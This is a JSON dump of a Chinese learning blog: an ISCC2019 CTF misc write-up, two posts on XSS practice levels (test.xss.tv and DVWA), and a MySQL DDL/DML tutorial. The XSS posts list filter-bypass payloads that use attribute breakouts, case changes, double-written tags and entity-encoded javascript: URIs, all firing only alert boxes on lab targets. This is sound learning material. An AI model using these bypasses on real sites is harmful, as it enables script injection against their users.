{"meta":{"title":"且听风吟","subtitle":"Never put off until tomorrow what may be done today!","description":"Saying and doing are two different things.","author":"💗zihao","url":"http://bealright.github.io","root":"/"},"pages":[{"title":"tags","date":"2014-12-22T04:39:04.000Z","updated":"2019-06-06T14:52:00.335Z","comments":true,"path":"tags/index.html","permalink":"http://bealright.github.io/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"ISCC2019杂项题(MISC)总结","slug":"ISCC2019杂项题(MISC)总结","date":"2019-05-31T12:58:44.957Z","updated":"2019-06-06T07:25:22.174Z","comments":true,"path":"2019/05/31/ISCC2019杂项题(MISC)总结/","link":"","permalink":"http://bealright.github.io/2019/05/31/ISCC2019杂项题(MISC)总结/","excerpt":"","text":"ISCC2019刚刚结束，作为一个萌新我是真的菜，真心菜不过也会几道杂项题，就总结一下做题思路。 Aesop’s secret下载附件，打开一张gif图用PS打开,可以得到一张完整的图做到这里没思路了，就回去看题目提示。Aesop’s chest and key lie within .to find it（伊索的胸膛和钥匙都在里面。为了找到它 ）还是一脸懵，用winhex打开我们得到的完整图和gif的图看看会有什么出现。在gif图中发现下面感觉像base64，试试吧发现前面有一个单词，百度翻译（盐），一般这些都是有密钥的加密密文，取在线网站挨个解下，看看那个可以，密钥当然就是ISCC了。发现这段密文是AES加密，但结果还是base64解码，但还是解不开，那就用这个结果再来一次AES解密试试。flag用了两次AES加密，需要解两次才能得到。 Keyes’ secret下载附件，得到一开始无从下手，毫无思路，不过还好有谷歌百度，经过查询，发现应该是键盘密码。这里虽然字符多，奈何我视力好，发现了{}，按照常理，里面就应该是答案，试试吧。手动分离，还需要耐心，认真，否则很容易搞错。我就直接画了一张图，把QAZ,WSX。。。画在同一竖直方向，这样我们画的时候不至于乱。提交的格式一般是flag，这道题应该是不会在提交格式为难我们，应该就是flag{...},果然，得出flag. Welcome打开附件，繁体字，一开始以为繁体字加密？？？，但感觉不用，不可能是这样做的。毫无思路。。。用sublime打开看看。这里格式编码的问题，懒得改了。但可以发现这些空格是有规律的，有的地方是一个，有的地方是两个，这里把一个空格替换为0，两个空格替换为1。得出一段二进制1011001100110110001100001011001110111101101001001010100110100001101000011010111110101011101000101010011000100001101001111010011010100010101111101 十六进制转换为ASCII即可得出flag转换网站 倒立屋这题LSB隐写，用神器Stegsolve打开选最低位，这里需要注意flag是倒过来的。。。 他们能在一起吗？做个题都能被。。。 唉不说了，做题吧给我们一张二维码，扫吧。扫出UEFTUyU3QjBLX0lfTDBWM19ZMHUlMjElN0Q=，base64解码这里在线网站有问题，应该是PASS{0K_I_L0V3_Y0u!}这肯定不会是答案，再回去研究二维码，用winhex打开，发现后面藏着一个txt文件,提取出来。小明要凉。。。得出flag 无法执行的exe不会修复。。。用winhex打开exe文件，观察观察。这个格式不就是base64转图片那个格式？？？，试试看，在线网站不行，用一下大佬的脚本，得出一张图片常见问题了，修改png格式即可了。 扫描得出IScC_2019 隐藏的信息10126 062 0126 0163 0142 0103 0102 0153 0142 062 065 0154 0111 0121 0157 0113 0111 0105 0132 0163 0131 0127 0143 066 0111 0105 0154 0124 0121 060 0116 067 0124 0152 0102 0146 0115 0107 065 0154 0130 062 0116 0150 0142 0154 071 0172 0144 0104 0102 0167 0130 063 0153 0167 0144 0130 060 0113 八进制转为十六再转位ascll即可。这里得自己写一个脚本，网上在线工具不能用。 Misc-01下载附件，打开用winhex打开，参照Jpg图片文件包括2字节：FF D8，改下即可修好。但我却在winhex里看到了很多png图binwalk一下。。。无语，扫一下吧。第一张remake:最危险的地方就是最安全的地方+1其他也类似，不过第50张不同，他加的是10086.。。。再联系一下提示果然，base64一下1flag&#123;15cC9012&#125; Misc-02Png图片文件包括8字节：89 50 4E 47 0D 0A 1A 0A，对照修改一下就可修复好一个二维码，扫一扫 中口由羊口中中大中中中井 当铺密码，解密一下1201902252228 这道题和前面那道类似，图片中还藏有东西，binwalk一下。一首让世界为你转身的歌。。。，我竟然还听出来了。那么这道题应该就是音频隐写了，利用神器MP3Stego密码即刚才破解的，破解出一个txt文件Unicode解码，即可得出flag. Score_List 下载附件，打开zip，发现有一个加密的exe文件 没什么思路，打开winhex看一下 这里还隐藏一个exe文件，binwalk分离出来 不知道用户名和密码。。。之前学长好像出过这种题，逆向的，试试吧。 发现了用户名和密码，结果也就得了出来了。 虽然做出了几道题，不过还是太菜，继续努力吧。","categories":[],"tags":[]},{"title":"web安全—XSS攻击(二)","slug":"web安全—XSS攻击(二)","date":"2019-04-28T08:05:42.885Z","updated":"2019-06-06T07:25:49.870Z","comments":true,"path":"2019/04/28/web安全—XSS攻击(二)/","link":"","permalink":"http://bealright.github.io/2019/04/28/web安全—XSS攻击(二)/","excerpt":"","text":"练习了DVWA靶场中的XSS了解了一些原理和攻击方式，接下来就用在线XSS平台开始实战一番。 在线XSS平台地址 第一关用最常用的攻击语句试试。 1&lt;script&gt;alert(/hacker/)&lt;/script&gt; 第二关就先把这个最简单的攻击语句放上去看看 1&lt;script&gt;alert(/hacker/)&lt;/script&gt; 没有出现弹窗，看下页面源代码。12&lt;input name=keyword value=\"&lt;script&gt;alert(/hacker/)&lt;/script&gt;\"&gt;&lt;input type=submit name=submit value=\"搜索\"/&gt; 观察代码，要想我们的语句起作用，就需要把前面的&lt;input&gt;标签给闭合掉。那就输入这样的语句：payload：1\"&gt;&lt;script&gt;alert(/hacker/)&lt;/script&gt; 第三关还是那个套路，放上最常用的语句试试没有成功，看看页面源代码 12&lt;input name=keyword value='&amp;lt;script&amp;gt;alert(/hacker/)&amp;lt;/script&amp;gt;'&gt;&lt;input type=submit name=submit value=搜索 /&gt; 发现输入的&lt;和&gt;被转义了既然过滤了&lt;和&gt;，那就换一种攻击方式，用onclick 事件，onclick 事件会在元素被点击时发生。onclick 事件直接包含在&lt;&gt;内，并且可以被执行。再观察页面源代码，是单引号，那就在前面加&#39;把value给闭合掉。payload：1'onclick='javascript:alert(/hacker/)' 输入之后，再点击一下输入框 第四关先拿一个攻击语句测试下，再看看页面源代码。 12&lt;input name=keyword value=\"scriptalert(/hacker/)/script\"&gt;&lt;input type=submit name=submit value=搜索 /&gt; 观察到&lt;和&gt;直接被过滤掉了那就用onclick 事件，这里是双引号，那就在前面输入&quot;，把value给闭合掉。payload：1\"onclick=\"javascript:alert(/hacker/)\" 第五关还是那个套路，先输入常用的看看,没有弹窗，看看页面源代码。 12&lt;input name=keyword value=\"\"o_nclick=\"javascript:alert(/xss/)\"\"&gt;&lt;input type=submit name=submit value=搜索 /&gt; 发现on中多了一个下划线，所以过滤了onclick事件，试试script,再看页面源代码。12&lt;input name=keyword value=\"\"&gt;&lt;scr_ipt&gt;alert(/hacker/)&lt;/script&gt;\"&gt;&lt;input type=submit name=submit value=搜索 /&gt; 果然，script也同样被过滤了。那就用&lt;a&gt;标签构造攻击语句试试。payload：1\"&gt;&lt;a href=\"javascript:alert(/xss/)\"&gt;hacker&lt;/a&gt; 也可以再后面加上//注释掉后面的&quot;/，以免对前面的语句产生影响。 第六关输入我们刚才用的语句，看页面源代码。 12&lt;input name=keyword value=\"&lt;scr_ipt&gt;alert(/hacker/)&lt;/script&gt;\"&gt;&lt;input type=submit name=submit value=搜索 /&gt; 12&lt;input name=keyword value=\"\"o_nclick=\"javascript:alert(/xss/)\"\"&gt;&lt;input type=submit name=submit value=搜索 /&gt; 12&lt;input name=keyword value=\"\"&gt;&lt;a hr_ef=\"javascript:alert(/xss/)\"&gt;点这里&lt;/a&gt;//\"&gt;&lt;input type=submit name=submit value=搜索 /&gt; 可以看到在这里，href和script、onclick事件都被过滤了。这里过滤的是onclick,改为大写试试。payload：1\"ONCLICK=\"javascript:alert(/hacker/)\" 在浏览博客的时候也看到一个大佬用的payload1\"&gt;&lt;svg x=\"\" Onclick=alert(1)&gt; 利用&lt;svg&gt;标签进行攻击。 第七关输入&quot;&gt;&lt;a href=&quot;javascript:alert(/xss/)&quot;&gt;查看页面源代码12&lt;input name=keyword value=\"\"&gt;&lt;a =\"java:alert(/xss/)\"&gt;点这里&lt;/a&gt;//\"&gt;&lt;input type=submit name=submit value=搜索 /&gt; 输入&quot;&gt;&lt;script&gt;alert(/hacker/)&lt;/script&gt;查看页面源代码12&lt;input name=keyword value=\"\"&gt;&lt;&gt;alert(/hacker/)&lt;/&gt;\"&gt;&lt;input type=submit name=submit value=搜索 /&gt; 这次更狠，直接把关键字给过滤没了用双写绕过payload：1\"&gt;&lt;sscriptcript&gt;alert(/hacker/)&lt;/sscriptcript&gt; 过滤掉中的script，但是一旦过滤掉，前后又可以重新拼接起来，形成一个完整的语句。 第八关输入&quot;onclick=&quot;javascript:alert(/hacker/)&quot;发现href,script被过滤，就试试onclick事件。页面源代码： 12&lt;input name=keyword value=\"&amp;quot;onclick=&amp;quot;javascript:alert(/hacker/)&amp;quot;\"&gt;&lt;input type=submit name=submit value=添加友情链接 /&gt; 发现&quot;,&lt;,&gt;也被转义了。再次观察源代码，发现友情链接。。。真的是提示，这不就是&lt;a&gt;标签绕过吗?1234&lt;input name=keyword value=\"javascript:alert(1)\"&gt;&lt;input type=submit name=submit value=添加友情链接 /&gt;&lt;/form&gt;&lt;/center&gt;&lt;center&gt;&lt;BR&gt;&lt;a href=\"javascr_ipt:alert(1)\"&gt;友情链接&lt;/a&gt; 既然下面有&lt;a&gt;标签，那我们就直接输入这个语句1javascript:alert(/hacker/) 但是script会被过滤，换一种方式表达script采用HTML字符实体转换地址方法一：payload：1java&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;:alert(/hacker/) 参考大佬的payload:方法二：用 html 的自解码机制就可以绕过1javasc&amp;#114;ipt:alert(0) 方法三：可以全转换为HTML实体1&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41; 第九关又是友情链接，把刚才的语句输入进去，查看页面源代码。 1234&lt;input name=keyword value=\"java&amp;amp;#x73;&amp;amp;#x63;&amp;amp;#x72;&amp;amp;#x69;&amp;amp;#x70;&amp;amp;#x74;:alert(/hacker/)\"&gt;&lt;input type=submit name=submit value=添加友情链接 /&gt;&lt;/form&gt;&lt;/center&gt;&lt;center&gt;&lt;BR&gt;&lt;a href=\"您的链接不合法？有没有！\"&gt;友情链接&lt;/a&gt;&lt;/center&gt;&lt;center&gt;&lt;img src=level9.png&gt;&lt;/center&gt; 我们输入的语句并没有进入到 &lt;a&gt;标签中，这里应该对格式有一定要求，查看大佬的博客后发现需要添加http://,否则不合法。payload：1java&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;:alert(/hacker/)//http:// 第九关和第八关类似，区别就是第九关添加了url验证合法性。 第十关这次更狠，连个输入框都不给。那就先看一下页面源代码吧 12345&lt;form id=search&gt;&lt;input name=\"t_link\" value=\"\" type=\"hidden\"&gt;&lt;input name=\"t_history\" value=\"\" type=\"hidden\"&gt;&lt;input name=\"t_sort\" value=\"\" type=\"hidden\"&gt;&lt;/form&gt; 一脸懵，不知道该如何下手了,只能去查看大佬的wp了。先测试测试哪个可以注入查看页面源代码，发现123&lt;input name=\"t_link\" value=\"\" type=\"hidden\"&gt;&lt;input name=\"t_history\" value=\"\" type=\"hidden\"&gt;&lt;input name=\"t_sort\" value=\"\"text\"\" type=\"hidden\"&gt; 找到了，t_sort就是注入点，那就开始注入吧代码中有隐藏的参数设置,把hidden改为textpayload：1&amp;t_sort=\"onclick=\"alert(/hacker/)\"type=\"text\" 也可以1&amp;t_sort=\" type=\"text\" onclick=\"alert(/hacker/) 第十一关还没有输入框，那类型应该和第十关比较类似，先看页面源代码。 123456&lt;form id=search&gt;&lt;input name=\"t_link\" value=\"\" type=\"hidden\"&gt;&lt;input name=\"t_history\" value=\"\" type=\"hidden\"&gt;&lt;input name=\"t_sort\" value=\"\" type=\"hidden\"&gt;&lt;input name=\"t_ref\" value=\"http://test.xss.tv/level10.php?keyword=well%20done!&amp;t_sort=%22%20type=%22text%22%20onclick=%22alert(1)\" type=\"hidden\"&gt;&lt;/form&gt; 一样的方法，先测试一下看那个可以注入查看页面源代码123456&lt;form id=search&gt;&lt;input name=\"t_link\" value=\"\" type=\"hidden\"&gt;&lt;input name=\"t_history\" value=\"\" type=\"hidden\"&gt;&lt;input name=\"t_sort\" value=\"3\" type=\"hidden\"&gt;&lt;input name=\"t_ref\" value=\"\" type=\"hidden\"&gt;&lt;/form&gt; 发现了t_sort是可以注入的，把刚才的payload拿来试试1&lt;input name=\"t_sort\" value=\"&amp;quot;onclick=&amp;quot;alert(/hacker/)&amp;quot;type=&amp;quot;text&amp;quot;\" type=\"hidden\"&gt; 发现&quot;被转义了，把&quot;转化为HTML实体也不行。查大佬的wp吧发现做到这一关需要burpsuite抓包工具来帮忙,所以先做到这里,等到会用抓包工具了，再回过头来继续做。 未完待续————————","categories":[],"tags":[]},{"title":"web安全-XSS攻击（一）","slug":"web安全-XSS攻击（一)","date":"2019-04-27T07:14:20.168Z","updated":"2019-06-06T07:25:44.668Z","comments":true,"path":"2019/04/27/web安全-XSS攻击（一)/","link":"","permalink":"http://bealright.github.io/2019/04/27/web安全-XSS攻击（一)/","excerpt":"","text":"XSS攻击和SQL注入都是web安全中很常见的攻击方式，最近先学习XSS攻击，待到XSS学完后再去学习SQL注入，哇（感慨一番），这些知识真的太有趣了。 在开始之前，有必要了解一下概念1、XSS跨站脚本攻击定义 跨站脚本攻击是指攻击者利用网站程序对用户输入过滤不足，输入可以显示在页面上对其他用户造成影响的HTML代码，从而盗取用户资料、利用用户身份进行某种动作或者访问者进行病毒侵害的一种攻击方式。为了与层叠样式表的缩写CSS区分开，跨站脚本攻击通常简写为XSS。 2、XSS类型1)反射型XSS 反射型XSS只是简单地将用户输入的数据直接或未经完善的安全过滤就在浏览器中进行输出，导致输出的数据中存在可被浏览器执行的代码数据。由于此种类型的跨站代码存在于URL中，所以黑客通常需要通过诱骗或加密变形等方式将存在恶意代码的链接发给用户，只有用户点击以后才能使得攻击成功实施。 2)存储型XSS 存储型XSS脚本攻击是指由于Web应用程序对用户输入数据的不严格，导致Web应用程序将黑客输入的恶意跨站攻击数据信息保存在服务端的数据库或其他文件形式中，当网页进行数据查询展示时，会从数据库中获取数据内容，并将数据内容在网页中进行输出展示，进而导致跨站脚本代码的执行。 3)DOM Based XSS 基于DOM的XSS跨站脚本攻击是通过修改页面。DOM节点数据信息而形成的XSS跨站脚本攻击。不同于反射型XSS和存储型XSS，基于DOM的XSS跨站脚本攻击往往需要针对具体的Javascript DOM代码进行分析，并根据实际情况进行XSS跨站脚本攻击的利用。 3、XSS攻击 1.XSS盗取用户信息 2.XSS盗取Cookie 3.XSS钓鱼攻击 4.XSS蠕虫攻击 了解完这些概念之后，就来实战。 一、在DVWA漏洞靶场练习一、反射型XSS进行DVWA环境中，选择安全等级，这里就按照从低到高的顺序进行。选择XSS(Reflected),查看一下源代码。观察代码可以发现，这里没有任何过滤。那就输入最常用的语句1&lt;script&gt;alert(/hacker/)&lt;/script&gt; 输入完之后便会出现这个弹窗了Medium接下来，切换到中级( Medium)如果还输入刚才我们输入的语句会出现什么结果，试试看。没有出现弹窗，看一下源代码。发现前面的&lt;script&gt;没有了，那就看看源代码中有什么过滤方式把&lt;script&gt;给过滤掉了查看源代码这里代码中用到了str_replace() 函数。str_replace() 函数的作用：替换字符串中的一些字符（区分大小写）。所以这里是把&lt;script&gt;给替换掉了，但是这个函数其实有个漏洞，区分大小写。。。那我输入这样的语句（大小写语句）1&lt;ScRipt&gt;alert(/hacker/)&lt;/script&gt; 这里代码只过滤了 &lt;script&gt;，那就换其他弹窗语句，也可以绕过。（body语句）1&lt;body onload=alert(/hacker/)&gt; 还可以采用双写绕过1&lt;sc&lt;script&gt;ript&gt;alert(/hacker/)&lt;/script&gt; 可以看到str_replace() 函数把包裹在外层的 &lt;script&gt;给过滤掉了，但是里面的并不会过滤掉，这样形成的还是一个完整的可执行的语句。 接下来，尝试高级的(high)拿&lt;script&gt;alert(/hacker/)&lt;/script&gt;这句来试试过滤完了，只剩下了一个&gt;那就看看源代码是如何过滤的preg_replace 函数执行一个正则表达式的搜索和替换。这里就了解一下正则表达式： 正则表达式(regularexpression)描述了一种字符串匹配的模式，可以用来检查一个串是否含有某种子串、将匹配的子串做替换或者从某个串中取出符合某个条件的子串等。 那这里就可以理解为代码将&lt;script全给替换了，那如何绕过。。。那我换一个语句弹窗不就行了。。。这里可以用body标签来弹框。1&lt;body onload=alert(/hacker/)&gt; 这就出现弹窗了。 二、储存型XSS 储存型和反射型最大的区别便是持久型，下面就从low到high练习，就可以清除的明白这两种类型的区别了。 low先看源代码代码很长，但我们只看最后输入结果那部分代码，发现stripslashes() 函数，查一下，发现这个函数的用法：删除由 addslashes() 函数添加的反斜杠。所以没有如何过滤，直接最常用的语句就可以了1&lt;script&gt;alert(/hacker/)&lt;/script&gt; 但是这里有字数限制，没有办法输入了那就打开F12改一下改为之后输入成功，下面看看有啥区别，先跳转到其他页面去，再打开这个页面，会发现。。。又给我们弹出了这个页面，这就是储存型XSS。每当你登陆这个界面，就会弹出这个弹框。 Medium接下来，看一下中级的。还是先输入一下常见的语句可以看到&lt;script&gt;被过滤掉了。看一下源代码和反射型XSS的Medium一样，所以可以用这两个语句绕过123&lt;body onload=alert(/hacker/)&gt;&lt;sc&lt;script&gt;ript&gt;alert(/hacker/)&lt;/script&gt;&lt;ScRipt&gt;alert(/hacker/)&lt;/script&gt; 这里我们把三种语句都注入，再次点击这个页面会出现三次弹窗 high正则表达式，用之前的语句就可以直接绕过。 通过这些练习，可以了解就反射型的XSS攻击时间短，例如弹窗只弹出一次，而存储型的XSS攻击则直接储存在数据库中，只要用户访问就可以弹出。 将安全等级调至impossible安全等级调至到impossible，即不可绕过。就以反射型的XSS来说吧先以最常用的语句来攻击结果：发现&lt;和&gt;都被转换了，我们就去看一下源代码发现了这样的一个函数PHP htmlspecialchars() 函数，htmlspecialchars() 函数把一些预定义的字符转换为 HTML 实体。预定义的字符是： &amp; （和号）成为 &amp;amp; &quot; （双引号）成为 &amp;quot; &apos; （单引号）成为 &apos; &lt; （小于）成为 &amp;lt; &gt; （大于）成为 &amp;gt; 所以这个函数就把我们输入的&lt;和&gt;给过滤掉了，所以这是一种防护手段，防止恶意的XSS攻击。 下面看一下存储型XSS的impossible还是先用常用的攻击一下显示结果：这就不需要再看后台源码了，这直接就显示&lt;和&gt;已经被过滤了.我们就看一下源代码发现在输出那有一个htmlspecialchars() 函数，所以这个原理就和反射型XSS攻击一样。这样DVWA练习就结束了。 感悟：果然只有动手去操作了，才会了解一些概念和一些攻击方式，有很多很好的平台供自己去学习，合天、安全龙、漏洞银行等等，只要自己想要去学，这些东西都可以学到，接下来就去XSS通关平台和谨灵实验室继续练习。 努力吧，少年！！！","categories":[],"tags":[]},{"title":"PHP学习总结（数据库概念、DDL语句、DML语句）","slug":"PHP学习总结（数据库概念、DDL语句、DML语句）","date":"2019-04-27T07:14:20.157Z","updated":"2019-06-06T07:25:40.070Z","comments":true,"path":"2019/04/27/PHP学习总结（数据库概念、DDL语句、DML语句）/","link":"","permalink":"http://bealright.github.io/2019/04/27/PHP学习总结（数据库概念、DDL语句、DML语句）/","excerpt":"","text":"自从做完一个简单的登陆注册页面，发现数据库知识真的很重要，所以要详细的学习一下数据库的知识。 一、数据库基本概念数据库可以理解为用来存储信息的仓库 表:表是数据的矩阵，在一个数据库中的表看起来像一个简单的电子表格。列: 一列(数据元素) 包含了相同的数据, 例如邮政编码的数据。行：一行（=元组，或记录）是一组相关的数据，例如一条用户订阅的数据。冗余：存储两倍数据，冗余降低了性能，但提高了数据的安全性。主键：主键是唯一的。一个数据表中只能包含一个主键,可以使用主键来查询据。表头(header): 每一列的名称;基本概念可以在菜鸟教程中学习菜鸟教程 二、DDL语句对数据库的操作 1).创建数据库1create database 数据库名; 例如:12mysql&gt; use bss;/使用这个名为bss的数据库Database changed 2)选择要操作的数据库1use 数据库名; 3)查看数据库中所有的数据表1show tables; 4)删除数据库1drop database 数据库名称; 例如：12345678910111213141516171819mysql&gt; create database xiao;Query OK, 1 row affected (0.00 sec)/这样就新建一个数据库，我们也可以在查看一下。mysql&gt; show databases;+--------------------+| Database |+--------------------+| information_schema || bss || myhtml || mysql || performance_schema || score || test || xiao |+--------------------+8 rows in set (0.00 sec)/这样数据库中便有了这个xiao数据库，接下来再删除它。mysql&gt; drop database xiao;Query OK, 0 rows affected (1.85 sec)/这样xiao数据库就被删除了。 对表的操作 1）创建表1234create table 表名( 字段1名 字段1类型 列的约束条件(可加可不加), 字段2名 字段2类型 列的约束条件, ); 例如：12create table Q(id1 int,id2 int);/这样就创建好一个名为Q的表 2）查看表1234show tables;//查看表数据desc 表名;//查看表结构 例如：12345678910111213141516171819mysql&gt; desc user;/查看表结构+-------+-------------+------+-----+---------+-------+| Field | Type | Null | Key | Default | Extra |+-------+-------------+------+-----+---------+-------+| id | int(11) | YES | | NULL | || pass | varchar(30) | YES | | NULL | || name | varchar(30) | YES | | NULL | || ttt | varchar(40) | YES | | NULL | || sss | varchar(20) | YES | | NULL | |+-------+-------------+------+-----+---------+-------+5 rows in set (0.01 sec)mysql&gt; show tables;/查看表数据+---------------+| Tables_in_bss |+---------------+| user || zzh |+---------------+2 rows in set (0.00 sec) 3）查看创建表的SQL语句123show create table 表名 \\Gshow create table 表名；//第一种相较于第二种更直观一些 例如：12345678910111213mysql&gt; show create table user;//查看建表命令+-------+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+| Table | Create Table |+-------+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+| user | CREATE TABLE `user` ( `id` int(11) DEFAULT NULL, `pass` varchar(30) DEFAULT NULL, `name` varchar(30) DEFAULT NULL, `ttt` varchar(40) DEFAULT NULL, `sss` varchar(20) DEFAULT NULL) ENGINE=MyISAM DEFAULT CHARSET=utf8 |+-------+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+1 row in set (0.00 sec) 4)删除表1drop table 表名; 例如：12345678910111213141516171819202122mysql&gt; create table hello(id int,you varchar(30),me varchar(30));Query OK, 0 rows affected (1.78 sec)/接下来我们查看一下mysql&gt; show tables;+---------------+| Tables_in_bss |+---------------+| hello || user || zzh |+---------------+3 rows in set (0.00 sec)/这样bbs数据库中便有这个hello的数据表了mysql&gt; drop table hello;Query OK, 0 rows affected (0.00 sec)mysql&gt; show tables;+---------------+| Tables_in_bss |+---------------+| user || zzh |+---------------+2 rows in set (0.00 sec)/这样就删除了刚才所创建的数据表 5)修改表的字段类型1alter table 表名 modify 字段名 字段类型; 例如：1alter table Q modify id1 varchar; 6)增加表字段1alter table 表名 add 字段名 字段类型; 例如：1alter table Q add id3 int; 7)删除表字段1alter table 表名 drop 字段名; 例如：1234567891011121314mysql&gt; alter table user drop pass;Query OK, 3 rows affected (1.81 sec)Records: 3 Duplicates: 0 Warnings: 0mysql&gt; desc user;/再次查询+----------+--------------+------+-----+---------+----------------+| Field | Type | Null | Key | Default | Extra |+----------+--------------+------+-----+---------+----------------+| Id | int(11) | NO | PRI | NULL | auto_increment || username | varchar(255) | YES | | NULL | || password | varchar(255) | YES | | NULL | |+----------+--------------+------+-----+---------+----------------+3 rows in set (0.01 sec)/这样的话就将新建的pass字段给删除了 8)字段改名1alter table 表名 change 旧字段名 新字段名 字段类型; 例如：123456789101112131415161718192021222324mysql&gt; desc zzh;+-------+-------------+------+-----+---------+-------+| Field | Type | Null | Key | Default | Extra |+-------+-------------+------+-----+---------+-------+| id | int(11) | YES | | NULL | || he | varchar(20) | YES | | NULL | || me | varchar(40) | YES | | NULL | |+-------+-------------+------+-----+---------+-------+3 rows in set (0.01 sec)/这里我们想把字段he改为youmysql&gt; alter table zzh change he you varchar(20);Query OK, 0 rows affected (0.37 sec)Records: 0 Duplicates: 0 Warnings: 0/再次进行查询mysql&gt; desc zzh;+-------+-------------+------+-----+---------+-------+| Field | Type | Null | Key | Default | Extra |+-------+-------------+------+-----+---------+-------+| id | int(11) | YES | | NULL | || you | varchar(20) | YES | | NULL | || me | varchar(40) | YES | | NULL | |+-------+-------------+------+-----+---------+-------+3 rows in set (0.01 sec)/可以看到he已经改为了you 9)修改字段排列排序例如： 12alter table Q modify id2 tinyint first;alter table Q modify id2 tinyint after id1; 10)更改表名1alter table 表名 rename 新的表名; 例如：12345678910111213141516171819202122mysql&gt; use bss;Database changedmysql&gt; show tables;+---------------+| Tables_in_bss |+---------------+| user || zzh |+---------------+2 rows in set (0.00 sec)/接下来我们把数据表user的名字改为usernamemysql&gt; alter table user rename username;Query OK, 0 rows affected (1.75 sec)/这些便实现了改表名称mysql&gt; show tables;+---------------+| Tables_in_bss |+---------------+| username || zzh |+---------------+2 rows in set (0.00 sec) DML语句这里我使用test数据库中的welcome表来进行练习 1)查询语句1select * from 表名; 2)插入记录1insert into 表名(字段1,字段2,字段3,...,字段n) values(值1,值2,值3,...,值n); 注意：values后面的顺序应该和字段的排序一致例如：123456789101112131415mysql&gt; insert into welcome(username,password) values('WMM',123); Query OK, 1 row affected (0.00 sec)/注意values中有字符的话，用单引号括起来。mysql&gt; insert into welcome(username,password) values(2,123); Query OK, 1 row affected (0.31 sec)/这里插入两条数据mysql&gt; select * from welcome;/查询语句 +----------+----------+ | username | password | +----------+----------+ | QTFY | 123 | | 2 | 123 | | WMM | 123 | +----------+----------+ 3 rows in set (0.00 sec) 3)一次插入多条记录12345insert into 表名(字段1,字段2,字段3,...,字段n) values (值1,值2,值3,...,值n), (值1,值2,值3,...,值n), (值1,值2,值3,...,值n); 例如：1234567891011121314151617181920mysql&gt; insert into welcome(username,password) values -&gt; (1,123), -&gt; (2,123), -&gt; (3,123), -&gt; (4,123); Query OK, 4 rows affected (0.00 sec) Records: 4 Duplicates: 0 Warnings: 0 mysql&gt; select * from welcome; +----------+----------+ | username | password | +----------+----------+ | QTFY | 123 | | 2 | 123 | | WMM | 123 | | 1 | 123 | | 2 | 123 | | 3 | 123 | | 4 | 123 | +----------+----------+ 7 rows in set (0.00 sec) 4)更新记录1.更新一个表 1update 表名 set 字段1=值1,字段2=值2,...字段n=值n [where 条件]; 例如：1234567891011121314151617mysql&gt; update welcome set password=1234 where username='QTFY'; Query OK, 1 row affected (0.00 sec) Rows matched: 1 Changed: 1 Warnings: 0 mysql&gt; select * from welcome; +----------+----------+ | username | password | +----------+----------+ | QTFY | 1234 | | 2 | 123 | | WMM | 123 | | 1 | 123 | | 2 | 123 | | 3 | 123 | | 4 | 123 | +----------+----------+ 7 rows in set (0.00 sec) /可以看到QTFY的密码已经从123改为1234 2.更新多个表中数据1update 表1,表2,...表n set 表1.字段1=表达式1,表n.字段n=表达式n [where 条件]; 例如：123456789101112131415161718192021222324252627282930/首先再创建一个表Qmysql&gt; create table Q(id int,age int);Query OK, 0 rows affected (0.08 sec)mysql&gt; desc Q;+-------+---------+------+-----+---------+-------+| Field | Type | Null | Key | Default | Extra |+-------+---------+------+-----+---------+-------+| id | int(11) | YES | | NULL | || age | int(11) | YES | | NULL | |+-------+---------+------+-----+---------+-------+2 rows in set (0.02 sec)mysql&gt; insert into Q(id,age) values(1,20);Query OK, 1 row affected (0.00 sec)mysql&gt; select * from Q;+------+------+| id | age |+------+------+| 1 | 20 |+------+------+1 row in set (0.00 sec)/更新语句mysql&gt; update welcome,Q set welcome.password=2000,Q.age=2000 where welcome.username='QTFY' and Q.age=20;Query OK, 2 rows affected (0.00 sec)Rows matched: 2 Changed: 2 Warnings: 0/更新结果：| QTFY | 20001 | 2000 | 5)删除记录1.删除单表中的数据 1delete from 表名 [where 条件]; 例如：1234567891011121314151617181920212223242526272829mysql&gt; select * from welcome; +----------+----------+ | username | password | +----------+----------+ | QTFY | 2000 | | 2 | 123 | | WMM | 123 | | 1 | 123 | | 2 | 123 | | 3 | 123 | | 4 | 123 | +----------+----------+ 7 rows in set (0.00 sec) /这里删除WMM记录 mysql&gt; delete from welcome where username='WMM'; Query OK, 1 row affected (0.00 sec) /删除成功了 mysql&gt; select * from welcome; +----------+----------+ | username | password | +----------+----------+ | QTFY | 2000 | | 2 | 123 | | 1 | 123 | | 2 | 123 | | 3 | 123 | | 4 | 123 | +----------+----------+ 6 rows in set (0.00 sec) 2.删除多个表中的数据、delete 表1,表2,…表n from 表1,表2,…表n [where 条件];不管是单表还是多表，不加where条件将会把表中的所有记录删除，所以操作时一定要小心。这里的操作和更新多表大致一样。 6)查询记录12select * from 表名;// 查询所有纪录 12select 字段名 from 表名； //查询某个字段的记录 例如：123456789101112131415161718192021mysql&gt; desc welcome; +----------+--------------+------+-----+---------+-------+ | Field | Type | Null | Key | Default | Extra | +----------+--------------+------+-----+---------+-------+ | username | varchar(255) | YES | | NULL | | | password | varchar(255) | YES | | NULL | | +----------+--------------+------+-----+---------+-------+ 2 rows in set (1.75 sec) /这里查username字段的记录 mysql&gt; select username from welcome; +----------+ | username | +----------+ | QTFY | | 2 | | 1 | | 2 | | 3 | | 4 | +----------+ 6 rows in set (0.00 sec) 7)查询不重复的记录123 select distinct field1,field2 from 表名;//只要field1,field2任何一个字段有不同就会被选择！//一般使用distinct,只筛选一个字段! 例如：123456789101112131415161718192021222324mysql&gt; select username from welcome; +----------+ | username | +----------+ | QTFY | | 2 | | 1 | | 2 | | 3 | | 4 | +----------+ 6 rows in set (0.00 sec) /采用查询不重复记录语句 mysql&gt; select distinct username from welcome; +----------+ | username | +----------+ | QTFY | | 2 | | 1 | | 3 | | 4 | +----------+ 5 rows in set (1.63 sec) 8)条件查询123= &lt; &gt; &gt;= &lt;= != 